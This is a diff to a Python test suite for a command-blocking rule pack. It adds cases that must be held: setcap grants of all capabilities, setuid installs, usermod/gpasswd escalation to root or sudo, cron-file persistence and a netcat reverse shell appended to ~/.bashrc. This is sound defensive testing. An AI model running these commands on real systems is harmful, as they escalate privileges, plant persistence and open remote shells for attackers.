@@ -233,6 +233,12 @@ class CodingPack(unittest.TestCase):
 
     def test_other_spellings_of_a_login_setuid_cron_or_network_shell_are_held(self):
         # the #752 review: each was allowed or only flagged; each rule's own id is asked for
+        every_cap = ",".join("cap_" + c for c in (
+            "chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable "
+            "net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot "
+            "sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease "
+            "audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read "
+            "perfmon bpf checkpoint_restore").split())
         held = [(c, "TK-A075") for c in (
             "gpasswd -a dev sudo", "gpasswd --add dev wheel", "gpasswd -M dev,ops admin", "usermod -o -u 0 dev",
             "usermod -ou 0 dev", "usermod --uid=0 --non-unique dev", "usermod -Gsudo dev", "usermod -a -G docker,sudo dev",
@@ -250,7 +256,15 @@ class CodingPack(unittest.TestCase):
             "setcap cap_sys_admin+eip x", "setcap CAP_SETUID+ep x",
             "setcap -q -n 1000 cap_net_bind_service,cap_setuid+ep x", "setcap cap_setuid,cap_net_bind_service+ep x",
             "setcap cap_net_bind_service+ep /a cap_sys_admin+p /b",
-            "/sbin/setcap cap_setuid+ep x")] + [(c, "TK-A011") for c in (
+            "/sbin/setcap cap_setuid+ep x",
+            # the #834 review: every capability, an operator before the flags, a number, a full list, GNU's
+            # prefixes of --mode and more than eight words before -m
+            "setcap =ep x", "setcap all=ep x", "setcap all+ep x", "setcap ALL+ep x", "setcap cap_net_raw,all+ep x",
+            "setcap 'cap_setuid=+ep' x", "setcap cap_setuid-e+p x", "setcap 7+ep x", "setcap 6=ep x",
+            "setcap 21+eip x", "setcap cap_net_raw,7+ep x", f"setcap {every_cap}+ep x", f"setcap {every_cap}=eip x",
+            "install --mod=4755 x y", "install --m=4755 x y", "install --mo 4755 x y",
+            "install -c -o root -g wheel -b -S .bak -p -v -m 4755 x y", "install -d -m 2775 /srv/shared")] + [
+            (c, "TK-A011") for c in (
             "cp evil /var/spool/cron/crontabs/dev", "echo '* * * * * x' > /etc/cron.daily/x",
             "cp evil.sh /etc/cron.hourly/")] + [(c, "TK-A078") for c in (
             "echo 'nc 192.0.2.7 4444 -e /bin/sh' >> ~/.bashrc", "echo 'nc -nv 192.0.2.7 4444 -e /bin/sh' >> ~/.bashrc",
@@ -270,7 +284,9 @@ class CodingPack(unittest.TestCase):
                   "install -m u-s x /usr/local/bin/x", "install -d /tmp/build", "install 4755 /tmp/dst",
                   "setcap cap_net_bind_service+ep x", "setcap -r x", "setcap cap_setuid-ep x",
                   "setcap cap_setuid,cap_net_bind_service-ep x", "setcap cap_setuid= x",
-                  "setcap -v cap_setuid+ep x", "setcap -q -v cap_setuid+ep x")
+                  "setcap -v cap_setuid+ep x", "setcap -q -v cap_setuid+ep x", "setcap =-ep x", "setcap -v all=ep x",
+                  "setcap 10+ep x", "setcap 70+ep x", "setcap cap_setuidx+ep x", "setcap allx+ep x",
+                  "echo setcap all=ep x", "install --mod=0755 x y", f"setcap {every_cap}-ep x")
         new = {want for _, want in held}
         for pack, engine, e in self.every_pack():
             for command, want in held:
